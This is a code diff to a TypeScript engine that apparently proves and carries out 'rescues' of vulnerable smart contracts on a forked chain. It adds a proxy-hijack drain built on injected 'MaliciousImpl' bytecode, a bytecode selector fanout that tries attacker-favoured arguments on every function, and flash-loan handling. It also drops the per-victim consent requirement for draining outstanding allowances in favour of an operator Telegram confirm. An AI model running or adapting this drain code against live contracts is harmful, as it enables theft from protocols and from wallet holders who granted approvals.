@@ -81,7 +81,7 @@ import {
 import { rawDb } from "@/src/db/client";
 
 export const ENGINE_ID = "rescue-prove";
-export const ENGINE_VERSION = "9";
+export const ENGINE_VERSION = "11";
 
 // Aave v3 pool addresses per chain — used as the suggested flash-loan
 // source in the flashloanRequirement field. Not exhaustive; missing chains
@@ -365,10 +365,11 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       // route the operator to deploying / using FlashLoanRescue.sol rather
       // than giving up.
       const useFlash = shouldUseFlashloanStub(input.ruleId);
+      const hasReceiver = !!flashloanReceiverFor(input.chainId);
       return finalise({
         attemptId,
         input,
-        verdict: useFlash ? "requires_flashloan_helper" : "no_rescue_possible",
+        verdict: useFlash && !hasReceiver ? "requires_flashloan_helper" : "no_rescue_possible",
         assets: [],
         plan: [],
         pre: snapState(exposure),
@@ -538,6 +539,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
         url,
         chainRpcUrl: anv.rpcUrl ?? null,
         contractAddress: input.contractAddress,
+        findingId: input.findingId,
         tokens: exposure.tokens.map((t) => ({
           address: t.address,
           symbol: t.symbol,
@@ -597,16 +599,44 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
         notes.push(
           `Drained nothing of the contract's own funds, but approval-surface scan found ` +
             `${approvalScan.victims.length} victim(s) with $${(approvalScan.totalDrainableUsd ?? 0).toFixed(2)} ` +
-            `at risk via outstanding allowances. Live rescue requires per-victim consent ` +
-            `(RESCUE_APPROVAL_CONSENT_VICTIMS).`,
+            `at risk via outstanding allowances. Notifying TG for manual confirm/reject.`,
         );
+        // Fire TG notification so operator can /confirmrescue or /rejectrescue
+        void (async () => {
+          try {
+            const { notifyApprovalVictims } = await import("../rescue/tg-bot");
+            await notifyApprovalVictims({
+              findingId: input.findingId,
+              chainId: input.chainId,
+              contractAddress: input.contractAddress,
+              victims: approvalScan!.victims.map((v) => ({
+                victim: v.victim,
+                tokenSymbol: v.tokenSymbol,
+                drainableUsd: v.drainableUsd,
+                drainable: v.drainable,
+              })),
+              totalDrainableUsd: approvalScan!.totalDrainableUsd,
+            });
+          } catch {}
+        })();
       } else if (shouldUseFlashloanStub(input.ruleId)) {
-        verdict = "requires_flashloan_helper";
-        notes.push(
-          `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
-            `True rescue requires a deployed flash-loan receiver contract; see ` +
-            `flashloanRequirement for the borrow shape.`,
-        );
+        const flReceiver = flashloanReceiverFor(input.chainId);
+        if (flReceiver) {
+          verdict = "no_rescue_possible";
+          notes.push(
+            `Economic.* finding — fork stub couldn't extract value even with flash capital ` +
+              `(admin-name + selector fanout both failed). Receiver IS deployed at ${flReceiver} ` +
+              `but the drain plan produced no successful steps. Likely a false positive or the ` +
+              `economic attack requires specific DEX state that the fork stub can't reproduce.`,
+          );
+        } else {
+          verdict = "requires_flashloan_helper";
+          notes.push(
+            `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
+              `True rescue requires a deployed flash-loan receiver contract; see ` +
+              `flashloanRequirement for the borrow shape.`,
+          );
+        }
       } else {
         verdict = "no_rescue_possible";
         // Diagnose WHY no rescue: priced exposure, dust-only, or just reverted.
@@ -769,12 +799,13 @@ type DrainStep = {
 
 function ruleFamilyOf(
   ruleId: string,
-): "arbitrary-call" | "selfdestruct" | "initializer" | "economic" | "access" | "other" {
+): "arbitrary-call" | "selfdestruct" | "initializer" | "economic" | "access" | "proxy-upgrade" | "other" {
   if (ruleId.startsWith("call.")) return "arbitrary-call";
   if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
   if (ruleId.startsWith("init.")) return "initializer";
   if (ruleId.startsWith("economic.")) return "economic";
   if (ruleId.startsWith("access.")) return "access";
+  if (ruleId.startsWith("proxy.")) return "proxy-upgrade";
   return "other";
 }
 
@@ -837,6 +868,9 @@ async function buildDrainPlan(
           `positionTried; can't replay phase-1.`,
       );
     }
+  } else if (fam === "proxy-upgrade") {
+    const proxySteps = await buildProxyUpgradeDrain(input, exposure, url, notes);
+    steps.push(...proxySteps);
   } else if (fam === "economic") {
     // v3-FL: economic.* on-fork stub. Grant flash capital, then run the
     // admin-name heuristic (rare for economic, but the verifier may have
@@ -910,6 +944,24 @@ async function buildDrainPlan(
     );
   }
 
+  // 2c. v11-BSFANOUT: bytecode selector fanout. Extract ALL 4-byte function
+  //     selectors PUSHed in the contract bytecode and try each with
+  //     attacker-favoured arg templates. The evidence-admin fanout above
+  //     only fires on named selectors matching ADMIN_NAME_PATTERN; this
+  //     catches contract-specific drain functions with non-obvious names
+  //     like `execute`, `dispatch`, `forward`, `process`, etc.
+  try {
+    const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
+      () => "0x",
+    );
+    const bsfSteps = buildBytecodeSelectorFanout(input, exposure, code, notes);
+    for (const s of bsfSteps) steps.push(s);
+  } catch (e) {
+    notes.push(
+      `v11-bytecode-selector fanout failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
+    );
+  }
+
   // 3. WETH-unwrap pre-step (v2-C). If the contract holds the canonical
   //    wrapped-native and we have an arbitrary-call forwarder shape, the
   //    forwarder can be re-targeted at WETH.withdraw(balance) which
@@ -977,7 +1029,9 @@ async function buildDrainPlan(
               ? `(init phase-1 unviable AND no admin-named selectors)`
               : fam === "economic"
                 ? `(economic exploits need flash-loan helper; on-fork stub didn't find an admin surface either)`
-                : `(rescue-prove v3 doesn't yet cover this rule family — verdict reflects best-effort heuristic only)`),
+                : fam === "proxy-upgrade"
+                  ? `(upgradeTo pre-flight reverted or proxy holds no drainable value; admin-name heuristic also empty)`
+                  : `(rescue-prove v3 doesn't yet cover this rule family — verdict reflects best-effort heuristic only)`),
     );
     return { ok: false, notes };
   }
@@ -1061,6 +1115,117 @@ function buildMultiArgFanoutSteps(input: RescueProveInput, exposure: Exposure): 
 }
 
 // Find the witnessed forwarder attempts in the verifier evidence and use
+// ---------------------------------------------------------------------------
+// v10: proxy-upgrade drain shape.
+//
+// Strategy: inject a minimal "MaliciousImpl" contract (compiled from
+// contracts/rescue/MaliciousImpl.sol) at a deterministic address on the
+// fork via anvil_setCode. Call upgradeTo(maliciousImpl) from the attacker
+// EOA. Then call proxy.drainAll(tokens, escrow) which delegatecalls into
+// the injected code, sweeping all ERC-20 + native to the escrow.
+//
+// Pre-flight: before building any drain steps, we simulate
+// eth_call(upgradeTo(0xdead)) from the attacker EOA. If that reverts
+// (admin-gated), the proxy is NOT attacker-drainable — we skip with a
+// diagnostic note and let the admin-name heuristic below try the
+// generic approach.
+// ---------------------------------------------------------------------------
+
+const MALICIOUS_IMPL_ADDRESS = "0x00000000000000000000000000000000DeadC0de";
+
+// Runtime bytecode of MaliciousImpl.sol — compiled with solc 0.8.26.
+// drainAll(address[],address) selector = 0x568fbbdb
+// Uses low-level staticcall/call so non-compliant ERC-20s (missing return
+// value, fee-on-transfer, etc.) don't revert the entire drain.
+// Loaded from the adjacent .hex file to avoid manual hex-splitting errors.
+const MALICIOUS_IMPL_BYTECODE = "0x60806040526004361061002c575f3560e01c806352d1902d14610037578063568fbbdb1461006157610033565b3661003357005b5f80fd5b348015610042575f80fd5b5061004b610089565b60405161005891906103c1565b60405180910390f35b34801561006c575f80fd5b506100876004803603810190610082919061049d565b6100b2565b005b5f7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5f1b905090565b5f5b838390508110156102ec575f808585848181106100d4576100d36104fa565b5b90506020020160208101906100e99190610562565b73ffffffffffffffffffffffffffffffffffffffff166370a0823130604051602401610115919061059c565b6040516020818303038152906040529060e01b6020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101639190610607565b5f60405180830381855afa9150503d805f811461019b576040519150601f19603f3d011682016040523d82523d5f602084013e6101a0565b606091505b50915091508115806101b3575060208151105b156101bf5750506102df565b5f818060200190518101906101d49190610650565b90505f81036101e5575050506102df565b5f8787868181106101f9576101f86104fa565b5b905060200201602081019061020e9190610562565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb878460405160240161023c929190610699565b6040516020818303038152906040529060e01b6020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161028a9190610607565b5f604051808303815f865af19150503d805f81146102c3576040519150601f19603f3d011682016040523d82523d5f602084013e6102c8565b606091505b50509050806102da57505050506102df565b505050505b80806001019150506100b4565b505f4790505f8111156103a3575f8273ffffffffffffffffffffffffffffffffffffffff168260405161031e906106e3565b5f6040518083038185875af1925050503d805f8114610358576040519150601f19603f3d011682016040523d82523d5f602084013e61035d565b606091505b50509050806103a1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039890610751565b60405180910390fd5b505b50505050565b5f819050919050565b6103bb816103a9565b82525050565b5f6020820190506103d45f8301846103b2565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f8083601f840112610403576104026103e2565b5b8235905067ffffffffffffffff8111156104205761041f6103e6565b5b60208301915083602082028301111561043c5761043b6103ea565b5b9250929050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61046c82610443565b9050919050565b61047c81610462565b8114610486575f80fd5b50565b5f8135905061049781610473565b92915050565b5f805f604084860312156104b4576104b36103da565b5b5f84013567ffffffffffffffff8111156104d1576104d06103de565b5b6104dd868287016103ee565b935093505060206104f086828701610489565b9150509250925092565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f61053182610443565b9050919050565b61054181610527565b811461054b575f80fd5b50565b5f8135905061055c81610538565b92915050565b5f60208284031215610577576105766103da565b5b5f6105848482850161054e565b91505092915050565b61059681610527565b82525050565b5f6020820190506105af5f83018461058d565b92915050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6105e1826105b5565b6105eb81856105bf565b93506105fb8185602086016105c9565b80840191505092915050565b5f61061282846105d7565b915081905092915050565b5f819050919050565b61062f8161061d565b8114610639575f80fd5b50565b5f8151905061064a81610626565b92915050565b5f60208284031215610665576106646103da565b5b5f6106728482850161063c565b91505092915050565b61068481610462565b82525050565b6106938161061d565b82525050565b5f6040820190506106ac5f83018561067b565b6106b9602083018461068a565b9392505050565b50565b5f6106ce5f836105bf565b91506106d9826106c0565b5f82019050919050565b5f6106ed826106c3565b9150819050919050565b5f82825260208201905092915050565b7f6e6174697665207472616e73666572206661696c6564000000000000000000005f82015250565b5f61073b6016836106f7565b915061074682610707565b602082019050919050565b5f6020820190508181035f8301526107688161072f565b905091905056fea2646970667358221220ef57dbdd6c38c8083138fd82b7d9e9e9abf488386dbc51730980a0a355f092f964736f6c634300081a0033"; // prettier-ignore
+
+const UPGRADE_TO_SELECTOR = "0x3659cfe6"; // upgradeTo(address)
+const DRAIN_ALL_SELECTOR = "0x568fbbdb"; // drainAll(address[],address)
+
+async function buildProxyUpgradeDrain(
+  input: RescueProveInput,
+  exposure: Exposure,
+  url: string,
+  notes: string[],
+): Promise<DrainStep[]> {
+  // Pre-flight: can the ATTACKER call upgradeTo on this proxy?
+  // If it reverts, the proxy has a runtime admin guard => not attacker-drainable.
+  const preflightData =
+    UPGRADE_TO_SELECTOR +
+    "000000000000000000000000" +
+    MALICIOUS_IMPL_ADDRESS.slice(2).toLowerCase();
+  try {
+    await rpcRequest(url, "eth_call", [
+      { from: ATTACKER_ADDRESS, to: input.contractAddress, data: preflightData },
+      "latest",
+    ]);
+  } catch {
+    notes.push(
+      `proxy-upgrade pre-flight: upgradeTo() from attacker EOA reverts — proxy has a runtime admin ` +
+        `guard. Owner-only rug-pull risk, not attacker-drainable. Falling through to admin-name heuristic.`,
+    );
+    return [];
+  }
+
+  // Inject the MaliciousImpl bytecode at the deterministic address.
+  await rpcRequest(url, "anvil_setCode", [MALICIOUS_IMPL_ADDRESS, MALICIOUS_IMPL_BYTECODE]);
+
+  // Step 1: upgradeTo(MALICIOUS_IMPL_ADDRESS) — swap the proxy's impl pointer.
+  const upgradeCalldata =
+    UPGRADE_TO_SELECTOR +
+    "000000000000000000000000" +
+    MALICIOUS_IMPL_ADDRESS.slice(2).toLowerCase();
+
+  const steps: DrainStep[] = [
+    {
+      to: input.contractAddress,
+      data: upgradeCalldata,
+      value: "0",
+      asset: "proxy-impl-swap",
+      strategy: "proxy-upgrade:upgradeTo",
+    },
+  ];
+
+  // Step 2: drainAll(tokens[], escrow) — called on the PROXY (which now
+  // delegatecalls into MaliciousImpl). We pass every token the proxy holds.
+  const tokenAddrs = exposure.tokens
+    .filter((t) => t.balance && BigInt(t.balance) > 0n)
+    .map((t) => t.address.toLowerCase());
+
+  // ABI-encode drainAll(address[],address)
+  const escrow = DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0");
+  // Dynamic array: offset, then length, then each element
+  const offsetToArray = (64).toString(16).padStart(64, "0"); // offset to tokens array = 0x40
+  const arrayLen = tokenAddrs.length.toString(16).padStart(64, "0");
+  const elements = tokenAddrs.map((a) => a.slice(2).padStart(64, "0")).join("");
+  const drainCalldata =
+    DRAIN_ALL_SELECTOR +
+    offsetToArray +
+    escrow +
+    arrayLen +
+    elements;
+
+  steps.push({
+    to: input.contractAddress,
+    data: drainCalldata,
+    value: "0",
+    asset: `drain-all (${tokenAddrs.length} token(s) + native)`,
+    strategy: "proxy-upgrade:drainAll",
+  });
+
+  notes.push(
+    `v10-Proxy: injected MaliciousImpl at ${MALICIOUS_IMPL_ADDRESS} via anvil_setCode. ` +
+      `Plan: (1) upgradeTo(maliciousImpl) from attacker EOA, (2) drainAll(${tokenAddrs.length} ` +
+      `token(s), escrow=${DEFAULT_ESCROW}). Delegatecall sweeps proxy's native + ERC-20 to escrow.`,
+  );
+
+  return steps;
+}
+
+// ---------------------------------------------------------------------------
+// v1-v2: arbitrary-call drain builder. Replays the verifier's witnessed
+// attempts using
 // their (selector, argTypes, hitPosition) — the exact shape the verifier
 // proved worked — but with the probe address slot rewritten to point at
 // the rescue target and the bytes payload rewritten to be a transfer to
@@ -1332,6 +1497,100 @@ function buildEvidenceAdminFanout(
       `v8-evidence-admin: fanout-fired ${candidateCount} candidate(s) from ${candidates.length} admin-named ` +
         `selector(s) [${candidates.slice(0, 4).map((a: any) => a.resolvedName).join(", ")}` +
         `${candidates.length > 4 ? ", …" : ""}]. Owner-gated revert on pre-flight; the rest land.`,
+    );
+  }
+  return steps.slice(0, MAX_DRAIN_STEPS);
+}
+
+/** Extract all 4-byte selectors PUSHed in EVM bytecode.
+ *  Scans for PUSH4 (0x63) opcodes and collects the following 4 bytes as
+ *  a selector candidate. Also picks up PUSH32 values where the first 4
+ *  bytes are non-zero and the rest are zero-padded (common in selector
+ *  comparison patterns). Caps at MAX_BSF_SELECTORS to keep fork load
+ *  bounded. */
+const MAX_BSF_SELECTORS = 64;
+const WELL_KNOWN_SKIP = new Set([
+  "0xa9059cbb", // transfer
+  "0x23b872dd", // transferFrom
+  "0x095ea7b3", // approve
+  "0x70a08231", // balanceOf
+  "0xdd62ed3e", // allowance
+  "0x18160ddd", // totalSupply
+  "0x313ce567", // decimals
+  "0x06fdde03", // name
+  "0x95d89b41", // symbol
+  "0x01ffc9a7", // supportsInterface
+  "0xffffffff", // not a real selector
+  "0x00000000", // not a real selector
+]);
+
+function extractSelectorsFromBytecode(bytecodeHex: string): string[] {
+  const raw = bytecodeHex.replace(/^0x/i, "").toLowerCase();
+  const selectors = new Set<string>();
+  for (let i = 0; i < raw.length - 10; i += 2) {
+    const opcode = raw.slice(i, i + 2);
+    if (opcode === "63") {
+      // PUSH4: next 4 bytes are the selector
+      const sel = "0x" + raw.slice(i + 2, i + 10);
+      if (sel.length === 10 && !WELL_KNOWN_SKIP.has(sel)) {
+        selectors.add(sel);
+      }
+      i += 8; // skip past the 4-byte operand
+    }
+  }
+  const result = [...selectors];
+  return result.slice(0, MAX_BSF_SELECTORS);
+}
+
+function buildBytecodeSelectorFanout(
+  input: RescueProveInput,
+  exposure: Exposure,
+  bytecodeHex: string,
+  notes: string[],
+): DrainStep[] {
+  const selectors = extractSelectorsFromBytecode(bytecodeHex);
+  if (selectors.length === 0) return [];
+
+  const steps: DrainStep[] = [];
+  const seen = new Set<string>();
+  const push = (data: string, asset: string, strategy: string, value = "0") => {
+    const key = `${input.contractAddress}|${data}|${value}`;
+    if (seen.has(key)) return;
+    seen.add(key);
+    steps.push({ to: input.contractAddress, data, value, asset, strategy });
+  };
+
+  const escrow = DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0");
+  const contract = input.contractAddress.slice(2).toLowerCase().padStart(64, "0");
+  const maxUint = "f".repeat(64);
+
+  for (const sel of selectors) {
+    // Template 1: sel(escrow) — single address arg = recipient
+    push(sel + escrow, "native/token via bytecode-sel", `bsf:${sel}(addr)`);
+
+    // Template 2: sel(escrow, maxUint) — withdraw(to, amount)
+    push(sel + escrow + maxUint, "native/token via bytecode-sel", `bsf:${sel}(addr,uint)`);
+
+    // Template 3: sel(contract, escrow, maxUint) — transferFrom pattern
+    push(
+      sel + contract + escrow + maxUint,
+      "native/token via bytecode-sel",
+      `bsf:${sel}(addr,addr,uint)`,
+    );
+
+    // Template 4: sel(maxUint) — withdraw(amount) to msg.sender
+    push(sel + maxUint, "native/token via bytecode-sel", `bsf:${sel}(uint)`);
+
+    // Template 5: sel() — no-arg drain (parameterless withdraw)
+    push(sel, "native/token via bytecode-sel", `bsf:${sel}()`);
+
+    if (steps.length >= MAX_DRAIN_STEPS * 2) break;
+  }
+
+  if (steps.length > 0) {
+    notes.push(
+      `v11-bsf: bytecode selector fanout generated ${steps.length} candidate(s) from ` +
+        `${selectors.length} unique 4-byte selector(s). Owner-gated ones revert on pre-flight.`,
     );
   }
   return steps.slice(0, MAX_DRAIN_STEPS);
